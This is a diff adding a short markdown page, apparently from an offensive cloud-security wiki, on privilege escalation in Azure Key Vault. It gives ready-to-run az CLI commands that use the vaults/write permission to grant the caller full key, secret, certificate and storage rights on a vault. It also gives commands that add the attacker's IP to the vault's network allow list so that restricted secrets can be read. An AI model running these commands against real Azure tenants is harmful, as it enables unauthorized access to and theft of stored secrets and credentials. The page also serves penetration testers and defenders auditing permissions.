@@ -1,0 +1,38 @@
+# Az - Key Vault Privesc
+
+## Azure Key Vault
+
+For more information about this service check:
+
+### `Microsoft.KeyVault/vaults/write`
+
+An attacker with this permission will be able to modify the policy of a key vault (the key vault must be using access policies instead of RBAC).
+
+```bash
+# If access policies in the output, then you can abuse it
+az keyvault show --name <vault-name>
+
+# Get current principal ID
+az ad signed-in-user show --query id --output tsv
+
+# Assign all permissions
+az keyvault set-policy \
+  --name <vault-name> \
+  --object-id <your-object-id> \
+  --key-permissions all \
+  --secret-permissions all \
+  --certificate-permissions all \
+  --storage-permissions all
+```
+
+### Modify Network Restrictions
+
+It might be possible tthat you have enough permissions th access sensitive data (like the value of a secret) but you can't access it because the key vault is restricted to a specific network. If you have the permission to modify the network restrictions you can add your IP to the list of allowed IPs.
+
+```bash
+# Get the current network restrictions
+az keyvault network-rule list --name <vault-name>
+
+# Add your IP to the list
+az keyvault network-rule add --name <vault-name> --ip-address <your-ip>
+```
